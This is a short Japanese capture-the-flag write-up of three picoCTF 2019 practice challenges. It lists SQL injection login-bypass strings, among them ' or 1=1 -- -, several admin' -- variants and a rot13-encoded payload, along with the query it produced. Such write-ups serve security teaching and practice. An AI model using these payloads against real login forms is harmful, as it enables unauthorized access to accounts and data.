# writeup

# 常設の練習
## picoCTF 2019
https://ctftime.org/task/9545  
### Irish-Name-Repo 1
`https://2019shell1.picoctf.com/problem/47253/`  
SQLインジェクションでadminとしてログインする。  

`admin`,`' or 1=1 -- -`でログイン成功！  
### Irish-Name-Repo 2
`https://2019shell1.picoctf.com/problem/60775/`  
`admin' --`,`なんでも`でusernameの方のSQLインジェクションで成功！  
passwordの方がフィルタリングされてるらしい。`or`が使えないので`||`とかで代用したりいろいろしたがダメだった。  
```txt
// 成功したやつ
admin' --
admin' -- -
admin' ; --
admin' ;#

// 成功しなかったやつ
admin' #
```
### Irish-Name-Repo 3
`https://2019shell1.picoctf.com/problem/47247/`  
htmlのhiddenとして`debug=0`という値をフォームでパスワードと一緒に送信しているので`debug=1`とすると、実行しようとしている
SQL構文がわかる。どうやらpasswordのテキストをrot13で変換してからSQLに突っ込んでいるらしい。  
`' be 1 -- -`とすると`' or 1 -- -`と変換されて以下のように成功！  
```txt
SQL query: SELECT * FROM admin where password = '' or 1 -- -'
```

# メモ
https://www.hamayanhamayan.com/entry/2020/06/25/222618  
https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
https://graneed.hatenablog.com/entry/2018/12/16/003745  
